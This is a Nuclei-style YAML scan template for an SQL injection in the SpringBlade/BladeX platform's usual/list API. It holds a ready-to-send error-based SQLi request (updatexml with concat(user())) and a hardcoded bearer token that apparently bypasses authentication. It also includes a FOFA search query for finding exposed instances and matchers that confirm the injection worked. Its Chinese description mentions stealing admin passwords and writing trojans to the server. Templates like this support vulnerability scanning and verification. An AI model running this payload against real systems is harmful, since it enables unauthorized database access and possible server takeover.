id: springblade-usual-list-sqli

info:
  name: SpringBlade usual/list - SQL Injection
  author: qwtd
  severity: high
  description: SpringBlade error/list 接口存在SQL注入
  reference:
    - BladeX企业级开发平台 usual/list 存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  metadata:
    fofa-query: body="https://bladex.vip/"
  tags: SpringBlade,Saber企业级开发平台

http:
  - raw:
      - |
        @timeout: 30s
        GET /api/blade-log/usual/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
        Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
        Connection: close

    max-redirects: 3
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "XPATH syntax error"
          - "SQLException"
        condition: and
